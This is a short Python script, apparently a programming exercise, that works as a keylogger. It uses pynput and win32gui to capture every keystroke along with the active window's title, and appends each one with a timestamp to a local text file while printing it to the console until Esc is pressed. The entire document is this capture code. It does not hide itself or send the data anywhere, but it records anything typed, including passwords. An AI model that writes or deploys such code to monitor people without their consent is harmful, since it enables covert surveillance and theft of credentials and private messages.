from pynput import keyboard
from datetime import datetime
import win32gui

def on_press(key):
    try:
        ventana = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        
        with open(r"C:\Users\Equipo\Desktop\ejercicios_bat\registro.txt", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] Ventana: {ventana} | Tecla: {key}\n")
        
        print(f"Ventana: {ventana} | Tecla: {key}")

    except Exception as e:
        print("Error:", e)

    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
